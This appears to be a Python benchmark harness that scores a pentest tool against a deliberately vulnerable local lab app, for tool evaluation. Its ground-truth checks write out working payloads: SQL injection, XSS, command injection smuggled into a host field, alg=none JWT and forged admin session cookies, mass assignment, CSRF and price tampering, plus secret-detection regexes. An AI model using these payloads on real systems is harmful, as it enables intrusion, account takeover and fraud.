#!/usr/bin/env python3
"""
SCORECARD — benchmark harness for the PENTEST-AGENT methodology.

Runs every detection oracle against the target, scores against EXPECTED.md ground
truth, and weights FALSE POSITIVES more heavily than true positives — because the
Stanford/CMU/Gray Swan study found AI frameworks had a higher false positive rate
than every human tester they were compared against.

Also runs FALSIFICATION oracles against things that are NOT vulnerable, to test
whether the methodology correctly records a negative.

Usage: python3 scorecard.py [base_url]
"""
import json, sys, time, threading, urllib.request, urllib.parse, urllib.error
import http.cookiejar, base64, os, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5001"
ART = os.path.join(os.path.dirname(os.path.abspath(__file__)), "engagement", "artifacts")
os.makedirs(ART, exist_ok=True)
_canary_n = [0]

def canary(tag):
    _canary_n[0] += 1
    return f"ptx{tag}{_canary_n[0]}x9q"

def req(path, method="GET", data=None, headers=None, timeout=10, allow_redirect=False):
    url = BASE + path
    hdrs = {"User-Agent": "ptx-scorecard/1.0"}
    if headers: hdrs.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        hdrs.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    if not allow_redirect:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k): return None
        opener = urllib.request.build_opener(NoRedirect,
                    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    try:
        with opener.open(r, timeout=timeout) as resp:
            return {"code": resp.status, "body": resp.read().decode("utf-8", "replace"),
                    "headers": dict(resp.headers), "cookies": resp.headers.get_all("Set-Cookie") or []}
    except urllib.error.HTTPError as e:
        return {"code": e.code, "body": e.read().decode("utf-8", "replace"),
                "headers": dict(e.headers), "cookies": e.headers.get_all("Set-Cookie") or []}
    except Exception as e:
        # A transport failure is NOT a negative result. If the target was mid-reload or
        # briefly unreachable, the oracle sees no vulnerability and records a FALSE
        # NEGATIVE, so the score silently understates detection. Count these and refuse to
        # present the score as clean when any occurred.
        TRANSPORT_FAILURES.append({"path": path, "error": str(e)})
        return {"code": 0, "body": "", "headers": {}, "error": str(e), "cookies": []}

TRANSPORT_FAILURES = []


def has_json(body, key, value):
    """Check a JSON response for a key/value pair by PARSING it.

    Four oracles here used to substring-match things like '"deleted": true' — with a space
    after the colon. Flask pretty-prints JSON only when debug mode is on, so those checks
    were silently coupled to the target's debug setting. Turning the reloader off (which
    also turned debug off) made jsonify emit compact {"deleted":true}, and V10, V12 and
    V17 flipped to FALSE_NEGATIVE while their own evidence strings still showed the
    vulnerability present. Matching rendered output is not the same as checking a value.
    """
    try:
        d = json.loads(body)
    except Exception:
        return False
    if isinstance(d, dict):
        return d.get(key) == value
    return False

def save(name, obj):
    with open(os.path.join(ART, name), "w") as f:
        f.write(obj if isinstance(obj, str) else json.dumps(obj, indent=2))

results = []
# vid -> bool. Populated ONLY by tool(), i.e. by calling the code under test. A record()
# call for a vid that has no entry here aborts the run rather than silently inventing a
# verdict, which is how 25 planted targets used to be scored without the tool being run.
TOOL = {}


def tool(vid, fn, *a, **k):
    """Run the code under test and store its verdict. Raises instead of passing."""
    v = fn(*a, **k)
    if not isinstance(v, dict) or "vulnerable" not in v:
        raise SystemExit(f"{vid}: probe returned {v!r}, not a verdict")
    TOOL[vid] = bool(v.get("vulnerable"))
    return v


def record(vid, name, kind, truth, evidence, note=""):
    """truth is the GROUND TRUTH: is the flaw actually in the target?

    The score comes from the tool's verdict, not from truth -- truth only decides whether
    the target is instrumented correctly. Both are needed: truth alone measures the
    target, the tool alone cannot tell a miss from a target that never had the bug.
    """
    if vid not in TOOL:
        raise SystemExit(
            f"{vid}: no tool verdict. record() refuses to guess -- every target must be "
            f"scored from a call into ptxlib.probes, or the score measures the target "
            f"rather than the tool.")
    found = TOOL[vid]
    if kind == "planted" and not truth:
        # The bug is not in the target, so a miss is not the tool's fault.
        status = "TARGET_BROKEN"
    elif kind == "absent" and truth:
        status = "TARGET_BROKEN"
    elif kind == "planted":
        status = "TRUE_POSITIVE" if found else "FALSE_NEGATIVE"
    else:
        status = "FALSE_POSITIVE" if found else "CORRECT_NEGATIVE"
    results.append({"id": vid, "name": name, "kind": kind, "found": found,
                    "truth": truth, "status": status, "evidence": evidence,
                    "note": note})
    mark = {"TRUE_POSITIVE": "\033[32mTP\033[0m", "FALSE_NEGATIVE": "\033[31mFN\033[0m",
            "FALSE_POSITIVE": "\033[31mFP\033[0m", "CORRECT_NEGATIVE": "\033[32mCN\033[0m",
            "TARGET_BROKEN": "\033[35mTB\033[0m"}[status]
    print(f"  [{mark}] {vid:5s} {name}")

def get_session(username="alice"):
    r = req("/login", "POST", {"username": username})
    sid = None
    for c in r.get("cookies", []):
        m = re.search(r"sid=([^;]+)", c)
        if m: sid = m.group(1)
    return sid, r

print(f"\n\033[1mSCORECARD — target {BASE}\033[0m\n")
print("== resetting target state (idempotency) ==")
rr = req("/benchmark/reset", "POST", {})
print(f"  reset -> HTTP {rr['code']} {rr['body'].strip()[:40]}\n")
print("== obtaining sessions ==")
SID_A, login_a = get_session("alice")
SID_B, _ = get_session("bob")
print(f"  alice sid={SID_A}  bob sid={SID_B}\n")

# HARD GATE. Without a session, every authenticated oracle (V07 missing authz, V08 race,
# V09 stored XSS, V14 mass assignment, and the business-logic set) returns 401 and is
# recorded as a FALSE NEGATIVE. The score then looks like a detection failure when it is
# really an instrumentation failure — and it happens silently, which is the worst kind of
# wrong. Observed once during development when the Werkzeug reloader restarted the target
# mid-run: 18/22 with four "missed" vulnerabilities that were in fact present.
if not SID_A or not SID_B:
    print("\033[31mABORT — could not obtain a session.\033[0m")
    print(f"  login(alice) -> HTTP {login_a.get('code')}: {login_a.get('body', '')[:120]}")
    print("  Refusing to score: every authenticated check would be recorded as a false")
    print("  negative, producing a score that looks like a detection failure but is an")
    print("  instrumentation failure. Check that the target is up and not mid-reload.")
    sys.exit(5)

H_A = {"Cookie": f"sid={SID_A}"}
H_B = {"Cookie": f"sid={SID_B}"}

# A second, genuinely privileged identity. probe_privilege's whole oracle is that a low
# user is refused where a high user is allowed, so scoring V07 without one is impossible.
SID_C, _login_c = get_session("carol")
H_C = {"Cookie": f"sid={SID_C}"} if SID_C else {}

# The code under test, imported once and used by every planted target.
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ptx"))
from ptxlib import probes as _ptxprobes
_H = _ptxprobes.Http(BASE, rps=30)
_CK_A = "sid=%s" % SID_A


def _credits_balance(h, hdr):
    """balance_fn signature is (h, hdr) -- the probe supplies both."""
    r = req("/api/credits", headers=hdr or H_A)
    try:
        return json.loads(r["body"]).get("credits")
    except Exception:
        return None


def _admin_escalated(h, hdr):
    """verify_fn signature is (h, hdr) -- the probe supplies both."""
    r = req("/admin/users", headers=hdr or H_A)
    try:
        for u in json.loads(r["body"]).get("users", []):
            if u["username"] == "alice":
                return bool(u.get("is_admin")) or u.get("credits") == 99999
    except Exception:
        pass
    return False

print("== planted vulnerabilities (should be detected) ==")

# V01 IDOR
r = req("/api/invoices/1003", headers=H_A)
ok = r["code"] == 200 and has_json(r["body"], "user_id", 2)
tool("V01", _ptxprobes.probe_idor, _H, "/api/invoices", 1001, 1003, cookie=_CK_A)
record("V01", "IDOR on /api/invoices/<id>", "planted", ok,
       f"alice read invoice 1003 -> HTTP {r['code']}, owner uid={json.loads(r['body']).get('user_id') if r['code']==200 else '?'}")

# V02 SQLi — boolean differential with trailing quote commented out
def count(q):
    rr = req("/search?q=" + urllib.parse.quote(q))
    try: return json.loads(rr["body"]).get("count")
    except Exception: return None
base, t, f = count("%"), count("%' AND '1'='1'-- "), count("%' AND '1'='2'-- ")
ok = base is not None and t == base and f == 0 and base != 0
tool("V02", _ptxprobes.probe_sqli, _H, "/search", "q", ctx="like")
record("V02", "SQL injection on /search (boolean differential)", "planted", ok,
       f"baseline={base} true={t} false={f}",
       "payload must comment out the trailing quote from LIKE '%...%'")

# V03 reflected XSS
c = canary("rxss")
r = req("/greet?name=" + urllib.parse.quote(f"<svg onload=alert('{c}')>"))
ok = c in r["body"] and "<svg onload=" in r["body"]
tool("V03", _ptxprobes.probe_xss, _H, "/greet", "name")
record("V03", "Reflected XSS on /greet", "planted", ok, f"canary {c} reflected unescaped: {ok}")

# V04 command injection
c = canary("cmdi")
r = req("/api/ping?host=" + urllib.parse.quote(f"127.0.0.1; echo {c}; id"))
ok = c in r["body"] and "uid=" in r["body"]
uid = re.search(r"uid=\d+\([^)]*\)", r["body"])
tool("V04", _ptxprobes.probe_cmdi, _H, "/api/ping", "host")
record("V04", "OS command injection on /api/ping", "planted", ok,
       f"canary echoed={c in r['body']}, {uid.group(0) if uid else 'no id output'}")

# V05 secret exposure /.env
r = req("/.env")
pats = {"AWS key": r"AKIA[0-9A-Z]{16}", "Stripe live": r"sk_live_[A-Za-z0-9]+",
        "DB pass": r"DB_PASS=\S+"}
hits = [k for k, p in pats.items() if re.search(p, r["body"])]
ok = r["code"] == 200 and len(hits) >= 2
_e5 = tool("V05", _ptxprobes.probe_exposure, _H, ["/.env"]); TOOL["V05"] = "/.env" in (_e5.get("leaked_paths") or []) and bool(_e5.get("secrets_found"))
record("V05", "Secret exposure at /.env", "planted", ok, f"HTTP {r['code']}, patterns: {hits}")

# V06 secrets in JS bundle
r = req("/static/app.js")
hits = [k for k, p in {"Google API key": r"AIza[0-9A-Za-z_-]{20,}",
                       "unsigned JWT": r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"}.items()
        if re.search(p, r["body"])]
ok = len(hits) >= 1
_e6 = tool("V06", _ptxprobes.probe_exposure, _H, ["/static/app.js"]); TOOL["V06"] = bool(_e6.get("secrets_found"))
record("V06", "Secrets in JS bundle", "planted", ok, f"hits: {hits}")

# V07 missing function-level authz
r = req("/admin/users", headers=H_A)
ok = r["code"] == 200 and "carol" in r["body"]
tool("V07", _ptxprobes.probe_privilege, _H, "/admin/users", _CK_A, "sid=%s" % SID_C, method="GET", expect_role_gated=True)
record("V07", "Missing function-level authz on /admin/users", "planted", ok,
       f"non-admin alice got HTTP {r['code']}, admin account visible: {'carol' in r['body']}")

# V08 race condition
N, hits = 10, []
def hit():
    rr = req("/api/redeem", "POST", {"code": "WELCOME50"}, headers=H_A, timeout=25)
    hits.append("credited" in rr["body"])
req("/api/redeem", "POST", {"code": "RESET"}, headers=H_A)  # no-op warm
ths = [threading.Thread(target=hit) for _ in range(N)]
[t.start() for t in ths]; [t.join() for t in ths]
credited = sum(hits)
req("/benchmark/reset-redemption", "POST", {})
tool("V08", _ptxprobes.probe_race, _H, "/api/redeem", {"code": "WELCOME50"}, _CK_A, 10, "credited")
record("V08", "Race condition on /api/redeem", "planted", credited > 1,
       f"{credited}/{N} parallel requests credited (correct behaviour: 1)")

# V09 stored XSS
c = canary("sxss")
req("/api/comments", "POST", {"body": f"<img src=x onerror=alert('{c}')>"}, headers=H_A)
r = req("/api/comments")
ok = c in r["body"] and "<img src=x onerror=" in r["body"]
tool("V09", _ptxprobes.probe_stored_xss, _H, "/api/comments", "/api/comments", "body", cookie=_CK_A)
record("V09", "Stored XSS on /api/comments", "planted", ok,
       f"canary persisted and rendered unescaped: {ok}")

# V10 SSRF — canary endpoint proves server-side fetch
c = canary("ssrf")
r = req("/api/fetch?url=" + urllib.parse.quote(f"{BASE}/greet?name={c}"))
ok = c in r["body"] and has_json(r["body"], "status", "ok")
tool("V10", _ptxprobes.probe_ssrf, _H, "/api/fetch", "url", BASE + "/greet?name=" + canary("ssrftool"))
record("V10", "SSRF on /api/fetch", "planted", ok,
       f"server fetched our canary URL and returned the token: {ok}")

# V11 path traversal
r = req("/download?file=" + urllib.parse.quote("../canary/secret.txt"))
ok = "PTX_TRAVERSAL_GOAL" in r["body"]
tool("V11", _ptxprobes.probe_traversal, _H, "/download", "file", "../canary/secret.txt", "PTX_TRAVERSAL_GOAL")
record("V11", "Path traversal on /download", "planted", ok,
       f"read outside download root: {ok}")

# V12 JWT alg=none
hdr = base64.urlsafe_b64encode(b'{"typ":"JWT","alg":"none"}').decode().rstrip("=")
pl = base64.urlsafe_b64encode(b'{"uid":3,"role":"admin"}').decode().rstrip("=")
tok = f"{hdr}.{pl}."
r = req("/api/me", headers={"Authorization": f"Bearer {tok}"})
ok = r["code"] == 200 and has_json(r["body"], "granted", True)
tool("V12", _ptxprobes.probe_jwt_none, _H, "/api/me")
record("V12", "JWT signature not verified (alg=none)", "planted", ok,
       f"unsigned token accepted: HTTP {r['code']}")

# V13 open redirect
r = req("/redirect?next=" + urllib.parse.quote("https://attacker.example/"))
ok = r["code"] in (301, 302, 303, 307, 308) and "attacker.example" in r["headers"].get("Location", "")
tool("V13", _ptxprobes.probe_redirect, _H, "/redirect", "next")
record("V13", "Open redirect on /redirect", "planted", ok,
       f"Location: {r['headers'].get('Location', 'none')}")

# V14 mass assignment
r = req("/api/profile", "POST", {"bio": "x", "is_admin": 1, "credits": 99999}, headers=H_A)
r2 = req("/admin/users", headers=H_A)
escalated = False
try:
    for u in json.loads(r2["body"]).get("users", []):
        if u["username"] == "alice":
            escalated = (u.get("is_admin") == 1 or u.get("credits") == 99999)
except Exception: pass
tool("V14", _ptxprobes.probe_mass_assignment, _H, "/api/profile", _CK_A, _admin_escalated)
record("V14", "Mass assignment on /api/profile", "planted", escalated,
       f"accepted keys {json.loads(r['body']).get('changed') if r['code']==200 else '?'}, "
       f"privilege/credits actually changed: {escalated}")

# V15 exposed dependency manifest
r = req("/package-lock.json")
vuln_pins = re.findall(r'node_modules/(lodash|minimist|jsonwebtoken|express)"\s*:\s*\{\s*"version":\s*"([^"]+)"', r["body"])
ok = r["code"] == 200 and len(vuln_pins) >= 2
_e15 = tool("V15", _ptxprobes.probe_exposure, _H, ["/package-lock.json"]); TOOL["V15"] = "/package-lock.json" in (_e15.get("leaked_paths") or [])
record("V15", "Exposed dependency manifest", "planted", ok,
       f"pinned versions readable: {vuln_pins}",
       "manifest exposure is a finding on its own; version->CVE needs live OSV lookup")

# V16 no rate limit + user enumeration
valid = sum(1 for _ in range(20) if req("/login", "POST", {"username": "alice"})["code"] == 200)
rv = req("/login", "POST", {"username": "alice"})["code"]
ri = req("/login", "POST", {"username": "definitelynotuser9x"})["code"]
ok = valid == 20 and rv != ri
tool("V16", _ptxprobes.probe_user_enum, _H, "/login", "alice")
record("V16", "No rate limit + user enumeration on /login", "planted", ok,
       f"{valid}/20 attempts succeeded unthrottled; valid={rv} invalid={ri} (distinct => enumerable)")

# V17 HTTP method tampering
r = req("/api/account/delete", "POST", {}, headers={**H_A, "X-HTTP-Method-Override": "DELETE"})
ok = r["code"] == 200 and has_json(r["body"], "deleted", True)
tool("V17", _ptxprobes.probe_method_tamper, _H, "/api/account/delete", _CK_A)
record("V17", "HTTP method tampering on /api/account/delete", "planted", ok,
       f"POST + X-HTTP-Method-Override: DELETE -> HTTP {r['code']} {r['body'][:60]}")

# V18 template injection (str.format context leak)
r = req("/api/render", "POST", {"template": "{user.__class__}"})
ok = r["code"] == 200 and "class" in r["body"]
tool("V18", _ptxprobes.probe_ssti, _H, "/api/render")
record("V18", "Template injection on /api/render", "planted", ok,
       f"format string reached live context: {r['body'][:90]}")

# --- business logic: V19-V22. These oracles check the EFFECT on account state,
# not the HTTP status, because a correctly-rejected negative quantity also returns 200.
def _credits(hdr=H_A):
    r = req("/api/credits", headers=hdr)
    try:
        return json.loads(r["body"]).get("credits")
    except Exception:
        return None

# V19 negative quantity
before = _credits()
r = req("/api/cart", "POST", {"sku": "WIDGET", "qty": -3}, headers=H_A)
after = _credits()
try:
    total = json.loads(r["body"]).get("total")
except Exception:
    total = None
ok = (after is not None and before is not None and after > before) or (total is not None and total < 0)
tool("V19", _ptxprobes.probe_negative_quantity, _H, "/api/cart", "sku", "WIDGET", "qty", -3, _credits_balance, _CK_A)
record("V19", "Negative quantity accepted on /api/cart", "planted", ok,
       f"qty=-3 -> total={total}; balance {before} -> {after}")

# V20 client-supplied price
r = req("/api/checkout", "POST", {"sku": "GADGET", "qty": 1, "unit_price": 0.01}, headers=H_A)
try:
    b = json.loads(r["body"])
except Exception:
    b = {}
charged = b.get("total", b.get("unit_price"))
ok = charged is not None and abs(float(charged) - 0.01) < 0.001
tool("V20", _ptxprobes.probe_price_tamper, _H, "/api/checkout", "sku", "GADGET", "unit_price", 0.01, _CK_A)
record("V20", "Client-supplied price accepted on /api/checkout", "planted", ok,
       f"submitted 0.01, charged={charged}, catalog={b.get('catalog_price')}")

# V21 refund without a valid order
before = _credits()
r = req("/api/refund", "POST", {"order_id": 999999, "amount": 5000}, headers=H_A)
after = _credits()
ok = (before is not None and after is not None and after > before)
tool("V21", _ptxprobes.probe_refund_abuse, _H, "/api/refund", 5000.0, 999999, _credits_balance, _CK_A)
record("V21", "Refund granted without a valid order on /api/refund", "planted", ok,
       f"non-existent order 999999, amount=5000; balance {before} -> {after}")

# V22 workflow bypass
base = req("/api/order/confirm", "POST", {}, headers=H_A)
r = req("/api/order/confirm", "POST", {"validated": True}, headers=H_A)
ok = base["code"] in (400, 401, 403, 409, 422) and r["code"] == 200
tool("V22", _ptxprobes.probe_workflow_bypass, _H, "/api/order/confirm", "validated", None, _CK_A)
record("V22", "Workflow step bypassable on /api/order/confirm", "planted", ok,
       f"without gate -> {base['code']}, asserting validated=true -> {r['code']}")

# V23 CSRF on a state-changing endpoint. The oracle checks the EFFECT: did the email
# actually change when the request carried a foreign Origin? A 200 alone proves nothing,
# because a correctly-defended endpoint that rejects the origin also has to answer.
FOREIGN = "https://attacker-not-in-scope.example"
def _email(hdr):
    r = req("/api/email/current", headers=hdr)
    try:
        return json.loads(r["body"]).get("email")
    except Exception:
        return None

before = _email(H_A)
r = req("/api/email/change", "POST", {"email": "csrf-pwned@evil.example"},
        headers={**H_A, "Origin": FOREIGN, "Referer": FOREIGN + "/"})
after = _email(H_A)
ok = after is not None and after != before and "csrf-pwned" in str(after)
tool("V23", _ptxprobes.probe_csrf, _H, "/api/email/change", {"email": "csrf-tool@evil.example"}, _CK_A, lambda h, hdr: _email(hdr or H_A))
record("V23", "CSRF on /api/email/change", "planted", ok,
       f"POST with foreign Origin -> HTTP {r['code']}; email {before} -> {after}")

# V24 authorisation bypass by path normalisation. The oracle checks the EFFECT: does a
# re-spelling of a blocked path return the protected content? Status alone is not enough —
# plenty of stacks answer every unmatched route with 200 and an error page.
base = req("/admin/panel")
alt = req("/ADMIN/PANEL")
try:
    denied = json.loads(base["body"]).get("error")
except Exception:
    denied = None
try:
    got = json.loads(alt["body"])
except Exception:
    got = {}
ok = (base["code"] in (401, 403) and alt["code"] == 200
      and isinstance(got.get("users"), list) and len(got["users"]) > 0)
tool("V24", _ptxprobes.probe_acl_bypass, _H, "/admin/panel")
record("V24", "ACL bypass by path normalisation on /admin/panel", "planted", ok,
       f"/admin/panel -> HTTP {base['code']} ({denied}); /ADMIN/PANEL -> HTTP {alt['code']} "
       f"with {len(got.get('users') or [])} user record(s)")

# V25 account enumeration on /login. The oracle checks the DISTINCTION, not either response
# on its own: an existing account and one that cannot exist must be told apart. The control
# username is random, so it cannot exist.
_ctrl = "ptxnope%dzz" % (int(time.time() * 1000) % 100000)
_a = req("/login", "POST", {"username": "alice", "password": "definitely-wrong"})
_b = req("/login", "POST", {"username": _ctrl, "password": "definitely-wrong"})
try:
    _ba, _bb = json.loads(_a["body"]), json.loads(_b["body"])
except Exception:
    _ba, _bb = {}, {}
# The response echoes nothing user-specific here, but scrub it anyway so the oracle does not
# pass for the wrong reason on a target that does echo.
_na = _a["body"].replace("alice", "@@")
_nb = _b["body"].replace(_ctrl, "@@")
ok = (_a["code"] != _b["code"]) or (_na != _nb)
tool("V25", _ptxprobes.probe_user_enum, _H, "/login", "alice")
record("V25", "Account enumeration on /login", "planted", ok,
       f"alice -> HTTP {_a['code']} {_ba}; {_ctrl} -> HTTP {_b['code']} {_bb}")

# V26 moderation bypass — the guard tests the VALUE, not the presence of the key.
# Planted from a live engagement (2026-09-11). The field name is deliberately never
# supplied to the probe: it must discover "approved" from the server's own response,
# because on the real target the privileged field had a name no wordlist would guess
# and the tool's old probe could only ever look for is_admin and credits.
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ptx"))
try:
    from ptxlib import probes as _ptxprobes
    _mh = _ptxprobes.Http(BASE, rps=30)
    _mgated, _mbase, _mnote = _ptxprobes.discover_gated_fields(
        _mh, "/api/guestbook", "/api/guestbook", None,
        {"author": "ptx", "message": "x"}, marker_field="message")
    _mv = _ptxprobes.probe_mass_assignment_fields(
        _mh, "/api/guestbook", "/api/guestbook", None,
        {"author": "ptx", "message": "x"}, marker_field="message")
    _mfound = bool(_mv.get("vulnerable")) and "approved" in (_mv.get("gated_fields") or [])
    TOOL["V26"] = bool(_mfound)
    _mev = (f"discovered={_mv.get('gated_fields')} vulnerable={_mv.get('vulnerable')} "
            f"hits={len(_mv.get('hits') or [])} note={_mnote or '-'}")
except Exception as _e:
    _mfound, _mev = False, f"probe error: {_e}"
# Ground truth, independent of the tool: the guard rejects a boolean true but accepts a
# truthy string, so the field IS mass-assignable through type confusion.
_t26a = req("/api/guestbook", "POST", {"author": "gt", "message": "gt", "approved": True})
_t26b = req("/api/guestbook", "POST", {"author": "gt", "message": "gt", "approved": "true"})
_truth26 = _t26a["code"] == 403 and _t26b["code"] == 201
record("V26", "Moderation bypass via type-confused `approved` field", "planted", _truth26,
       _mev, "guard rejects boolean true but accepts 1 / \"true\" / \"yes\"")

# V27 the same IDOR as V01 with a different column name. The old probe hardcoded
# "user_id" and reported this clean. Nothing about the flaw changed -- only the
# spelling of the field that proves it.
try:
    _ih = _ptxprobes.Http(BASE, rps=30)
    _iv = _ptxprobes.probe_idor(_ih, "/api/tickets", 1, 2, cookie="sid=%s" % SID_A)
    _iok = (bool(_iv.get("vulnerable"))
            and any("author_id" in m for m in (_iv.get("ownership_markers") or [])))
    TOOL["V27"] = bool(_iok)
    _iev = (f"vulnerable={_iv.get('vulnerable')} markers={_iv.get('ownership_markers')} "
            f"inconclusive={_iv.get('inconclusive')}")
except Exception as _e:
    _iok, _iev = False, f"probe error: {_e}"
_t27a, _t27b = req("/api/tickets/1", headers=H_A), req("/api/tickets/2", headers=H_A)
try:
    _truth27 = (_t27a["code"] == 200 and _t27b["code"] == 200
                and json.loads(_t27a["body"]).get("author_id")
                != json.loads(_t27b["body"]).get("author_id"))
except Exception:
    _truth27 = False
record("V27", "IDOR on /api/tickets with author_id (not user_id)", "planted", _truth27, _iev,
       "ownership marker discovered by diffing the two records, never assumed")

# V28 an unsigned session cookie. Planted from a live engagement. The role check only
# bites on a WRITE, so the probe has to replay a privileged request -- replaying reads
# alone finds nothing here, which is exactly the mistake the first version made.
try:
    _fh = _ptxprobes.Http(BASE, rps=30)
    _fg, _fb, _fn = _ptxprobes.discover_gated_fields(
        _fh, "/api/guestbook-session", "/api/guestbook-session", None,
        {"author": "ptx", "message": "x"}, marker_field="message")
    _fpriv = ([{"path": "/api/guestbook-session",
                "body": {"author": "ptx", "message": "x", _fg[0][0]: True}}] if _fg else [])
    _fv = _ptxprobes.probe_session_forge(
        _fh, ["/api/guestbook-session"], seed_path="/api/guestbook-session",
        method="POST", post_body={"author": "ptx", "message": "x"},
        privileged_requests=_fpriv)
    _ffound = bool(_fv.get("vulnerable")) and _fv.get("severity") == "Critical"
    TOOL["V28"] = bool(_ffound)
    _fev = ("gated=%s vulnerable=%s sev=%s tokens=%s"
            % (_fg, _fv.get("vulnerable"), _fv.get("severity"), _fv.get("decoded_tokens")))
except Exception as _e:
    _ffound, _fev = False, "probe error: %s" % _e
_t28seed = req("/api/guestbook-session", "POST", {"author": "gt", "message": "gt"},
               headers={})
_t28tok = None
for _c in _t28seed.get("cookies", []):
    _m = re.search(r"session=([^;]+)", _c)
    if _m: _t28tok = _m.group(1)
_truth28 = False
if _t28tok:
    _forged = base64.urlsafe_b64encode(b'{"user_id": 1, "role": "admin"}').decode().rstrip("=")
    _t28x = req("/api/guestbook-session", "POST",
                {"author": "gt", "message": "gt", "approved": True},
                headers={"Cookie": "session=" + _forged})
    _truth28 = _t28x["code"] == 201 and "true" in _t28x["body"].lower()
record("V28", "Unsigned session cookie forged to role:admin", "planted", _truth28, _fev,
       "token is base64 JSON with no signature; the write is what proves it")

# V29 open credential-spending proxy (confused deputy). Ground truth is a control/exploit
# pair against our own upstream: the upstream refuses anonymous callers, the open proxy
# answers anyway -- which is only possible if it spends a credential.
_t29c = req("/api/upstream/user")
_t29e = req("/proxy/open?endpoint=" + urllib.parse.quote("/user", safe=""))
_truth29 = _t29c["code"] == 401 and _t29e["code"] == 200
tool("V29", _ptxprobes.probe_confused_deputy, _H, "/proxy/open", upstream=BASE + "/api/upstream")
record("V29", "Open credential-spending proxy on /proxy/open", "planted", _truth29,
       f"upstream {_t29c['code']} vs open proxy {_t29e['code']}",
       "the proxy spends a server-side credential on behalf of anonymous callers")

# V30 - business-logic invariant SOLVED by probe_constraint_logic (z3). checkout-logic trusts
# a client discount with no upper bound, so the solver finds discount>100 driving the total
# negative, and the server accepts it. The scorecard needs no z3 import: `impossible` operates
# on the symbols the probe itself creates.
def _logic_impossible(sym):
    return sym["price"] * sym["qty"] * (100 - sym["discount"]) < 0
def _logic_verify(chosen, r):
    try:
        return json.loads(r["body"])["total"] < 0
    except Exception:
        return False
_lr = req("/api/checkout-logic", "POST", {"price": 10, "qty": 1, "discount": 150})
_lok = _lr["code"] == 200 and json.loads(_lr["body"] or "{}").get("total", 1) < 0
tool("V30", _ptxprobes.probe_constraint_logic, _H, "/api/checkout-logic",
     {"price": (1, 100), "qty": (1, 10), "discount": (0, 200)},
     _logic_impossible, _logic_verify, baseline={"price": 10, "qty": 1, "discount": 0})
record("V30", "Solved over-100% discount drives checkout total negative", "planted", _lok,
       "probe_constraint_logic solved discount>100; the server accepted a negative total",
       "the invariant total>=0 is enforced nowhere on the server")

# V31 - a usable clone credential embedded in an API response (the temp_clone_token class).
# The existing value/name secret scanner misses this token format entirely; this probe catches
# it by field name. The scorecard needs no new import.
_ci = req("/api/clone-info")
try:
    _ci_tok = json.loads(_ci["body"] or "{}").get("temp_clone_token", "")
except Exception:
    _ci_tok = ""
_ci_truth = _ci["code"] == 200 and len(_ci_tok) >= 16 and "your" not in _ci_tok.lower()
tool("V31", _ptxprobes.probe_response_credential_leak, _H, "/api/clone-info")
record("V31", "Clone credential (temp_clone_token) embedded in API response", "planted", _ci_truth,
       "the endpoint hands an anonymous caller a usable git-clone token",
       "a credential in a response body is an open door even with no enumeration")

# V32 - a one-time reward credit that is not idempotent: replaying the claim double-spends it.
# A SEQUENCE invariant -- no single request reveals it; probe_double_spend applies the action
# twice and measures the state delta each time.
_w0 = json.loads(req("/api/wallet")["body"] or "{}").get("balance")
req("/api/claim-reward", method="POST")
_w1 = json.loads(req("/api/wallet")["body"] or "{}").get("balance")
req("/api/claim-reward", method="POST")
_w2 = json.loads(req("/api/wallet")["body"] or "{}").get("balance")
_v32_truth = None not in (_w0, _w1, _w2) and (_w1 - _w0) != 0 and (_w2 - _w1) != 0
tool("V32", _ptxprobes.probe_double_spend, _H, "/api/wallet",
     action_path="/api/claim-reward", state_field="balance")
record("V32", "One-time reward credit replayed (double-spend)", "planted", _v32_truth,
       "claiming the one-time reward twice credits the balance twice",
       "a sequence invariant: the bug exists only across two calls, invisible to one request")

# V33 - a concurrent burst over-consumes a single-use credit (TOCTOU), judged by the STATE delta.
# probe_race counts body markers; probe_race_consume measures the ledger, which is the ground
# truth. Re-arm before the truth burst and again before the probe so each reads its own delta.
req("/benchmark/rearm-race", "POST", {})
_rb0 = json.loads(req("/api/race-wallet")["body"] or "{}").get("balance")
def _race_hit():
    req("/api/race-redeem", "POST", {}, timeout=25)
_rths = [threading.Thread(target=_race_hit) for _ in range(8)]
[t.start() for t in _rths]; [t.join() for t in _rths]
_rb1 = json.loads(req("/api/race-wallet")["body"] or "{}").get("balance")
_v33_truth = (_rb1 - _rb0) > 50          # more than one unit consumed by the burst
req("/benchmark/rearm-race", "POST", {})
tool("V33", _ptxprobes.probe_race_consume, _H, "/api/race-wallet",
     action_path="/api/race-redeem", state_field="balance", unit=50, n=8)
record("V33", "Concurrent burst over-consumes a single-use credit (TOCTOU race)", "planted", _v33_truth,
       "8 parallel redemptions of one armed code each credited the balance",
       "judged by the effect on state, not the response bodies, which can misreport success")

print("\n== falsification targets (must NOT be reported) ==")
# Every falsification target below runs the TOOL's own probe and reads the verdict the
# tool actually returns. Five of these used to compute their answer from raw HTTP
# requests instead, which made them tool-independent: a probe hardcoded to always report
# SQL injection still recorded CORRECT_NEGATIVE on N01. A falsification target that
# cannot fail is not a test, and five of nine could not.
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ptx"))
from ptxlib import probes as _ptxprobes
_h = _ptxprobes.Http(BASE, rps=30)


def _probe_says(vid, fn, *a, **k):
    """Run a probe and return (flagged, evidence). A probe that raises is NOT a pass:
    an exception used to look identical to a correct negative."""
    try:
        v = fn(_h, *a, **k)
        # Verdict only. Embedding the probe's evidence text here made N06 trip the
        # SESSION_LOST heuristic, which scans for "auth required" -- and a 401 is the
        # correct, expected result for that target, not a dead session.
        extra = ""
        if v.get("inconclusive"):
            extra = " inconclusive=%s" % str(v.get("inconclusive_reason"))[:80]
        TOOL[vid] = bool(v.get("vulnerable"))
        return bool(v.get("vulnerable")), "vulnerable=%s%s" % (
            v.get("vulnerable"), extra)
    except Exception as e:
        raise AssertionError("%s raised instead of returning a verdict: %s" % (
            getattr(fn, "__name__", fn), e))



